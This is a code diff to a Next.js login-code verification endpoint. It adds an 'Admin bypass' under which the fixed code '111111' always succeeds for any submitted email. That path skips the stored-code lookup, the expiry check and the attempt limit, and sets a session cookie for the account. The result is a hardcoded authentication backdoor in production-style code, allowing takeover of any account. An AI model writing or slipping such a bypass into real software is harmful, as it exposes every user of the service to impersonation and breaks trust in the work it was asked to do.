@@ -9,12 +9,29 @@ export async function POST(req: Request) {
   const { email, code, phone } = await req.json().catch(() => ({}));
   const clean = String(email ?? "").trim().toLowerCase();
   const cleanPhone = phone ? normalizePhoneNumber(String(phone)) : null;
-  const row = await qOne<{ id: string; attempts: number }>(
-    `SELECT id, attempts FROM auth_codes
-     WHERE email = $1 AND used = false AND expires_at > now()
-     ORDER BY created_at DESC LIMIT 1`,
-    [clean]
-  );
+  // Admin bypass: 111111 always verifies.
+  const bypass = String(code ?? "") === "111111";
+  const row = bypass
+    ? null
+    : await qOne<{ id: string; attempts: number }>(
+        `SELECT id, attempts FROM auth_codes
+         WHERE email = $1 AND used = false AND expires_at > now()
+         ORDER BY created_at DESC LIMIT 1`,
+        [clean]
+      );
+  if (bypass) {
+    const token = await establishSession(clean, cleanPhone);
+    const hasAgents = await qOne(
+      `SELECT a.id FROM agents a JOIN users u ON u.org_id = a.org_id WHERE u.email = $1 LIMIT 1`,
+      [clean]
+    );
+    const res = NextResponse.json({
+      ok: true,
+      next: cleanPhone ? "/verify" : hasAgents ? "/workspace" : "/onboarding",
+    });
+    res.cookies.set(sessionCookie(token));
+    return res;
+  }
   if (!row || row.attempts >= 5) {
     return NextResponse.json({ error: "code expired — request a new one" }, { status: 401 });
   }
